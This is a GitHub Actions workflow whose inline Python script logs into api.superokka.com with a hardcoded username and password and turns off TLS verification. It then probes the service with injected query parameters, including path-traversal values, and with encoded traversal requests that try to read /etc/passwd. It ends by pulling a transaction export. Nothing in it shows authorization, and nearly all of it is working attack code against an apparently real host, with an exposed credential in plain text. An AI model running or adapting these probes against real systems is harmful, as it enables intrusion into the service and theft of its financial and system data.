name: superokka
on:
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: pip install --quiet requests pypdf
      - run: |
          python3 - <<'PYEOF'
          import requests, json, urllib3
          urllib3.disable_warnings()
          B = "https://api.superokka.com"
          s = requests.Session(); s.verify = False
          r = s.post(f"{B}/auth/login", json={"username":"financeokka","password":"KwRce2026!x#9","force":True}, timeout=25)
          print("LOGIN:", r.status_code)
          A = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
          TID = "2e029cbf-9912-424d-94e1-f3282adacda1"
          for q in ["", "?type=return", "?type=Return", "?type=../../../../tmp/pwned", "?filename=test.pdf",
                    "?direction=return", "?lang=id", "?template=raw"]:
              rr = s.post(f"{B}/transactions/{TID}/etickets{q}", headers=A, timeout=180)
              print("Q", q[:44], "→", rr.status_code, rr.text[:160])
          # encoded traversal on uploads static
          for p in ["/uploads/%2e%2e/%2e%2e/etc/passwd", "/uploads/etickets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "/uploads/..%2f..%2f..%2fetc%2fpasswd", "/uploads/etickets/..%252f..%252fetc%252fpasswd"]:
              rr = s.get(f"{B}{p}", timeout=20)
              print("TRAV", p[:60], "→", rr.status_code, rr.text[:80])
          # export with valid ISO
          rr = s.get(f"{B}/transactions/export?startDate=2026-01-01T00:00:00.000Z&endDate=2026-12-31T00:00:00.000Z", headers=A, timeout=60)
          print("EXPORT ISO:", rr.status_code, rr.headers.get("Content-Type","")[:30], rr.text[:100])
          PYEOF
